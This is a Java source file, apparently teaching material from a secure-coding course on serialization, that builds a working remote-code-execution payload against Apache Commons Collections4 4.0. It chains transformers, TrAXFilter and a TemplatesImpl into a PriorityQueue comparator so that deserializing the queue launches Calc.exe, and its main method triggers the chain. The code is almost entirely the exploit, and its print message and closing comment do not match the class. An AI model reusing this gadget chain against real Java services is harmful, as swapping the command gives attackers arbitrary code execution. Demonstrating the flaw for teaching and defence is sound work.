// The MIT License (MIT)
//
// Copyright (c) 2017 Robert C. Seacord
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package ser05j;

import javax.xml.transform.Templates;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import java.util.PriorityQueue;

public class RCE {

  private static byte[] serialize(Object o) throws IOException {
    try (ByteArrayOutputStream ba = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(ba);) {
      oos.writeObject(o);
      return ba.toByteArray();
    }
  }

  /**
   * Creates a Remote Command Execution Exploit based on Apache Commons Collections4 4.0
   *
   * @throws Exception for <i>everything</i>.
   * @return a byte array containing the serialized queue
   */
  static byte[] RCEpayload() throws Exception {

    Object templates = Gadgets.createTemplatesImpl("Calc.exe"); 

    ConstantTransformer<Object, Class<String>> constant = new ConstantTransformer<>(String.class);

    // mock method name until armed
    Class<?>[] paramTypes = new Class[] { String.class };
    Object[] args = new Object[] { "foo" }; 
    InstantiateTransformer<?> instantiate = new InstantiateTransformer<>(paramTypes, args);

    // grab defensively copied arrays
    paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes"); 
    args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs"); 

    @SuppressWarnings("unchecked")
    Transformer<Object, Object> chain = new ChainedTransformer<Object>(new Transformer[] { constant, instantiate });

    // create queue with numbers
    PriorityQueue<Object> queue = new PriorityQueue<>(2, new TransformingComparator<>(chain));
    queue.add(1);
    queue.add(1);

    // swap in values to arm
    Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class); 
    paramTypes[0] = Templates.class;
    args[0] = templates;
        
    return serialize(queue); 
  }
  
  private static Object deserialize(byte[] buffer) throws IOException, ClassNotFoundException {
    Object obj;
    try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(buffer))) {
       obj = ois.readObject();
    }
    return obj;
  }

  public static void main(String[] args)  {    
     try {
      deserialize(RCEpayload());
      System.out.println("DoS has been deserialized."); 
    } catch (@SuppressWarnings("unused") Exception e) {
      // Exceptions can be eliminated by wrapping PriorityQueue
      // in a Callable with a custom security manager
    }
  } // end main
} // end LookAheadDeserializer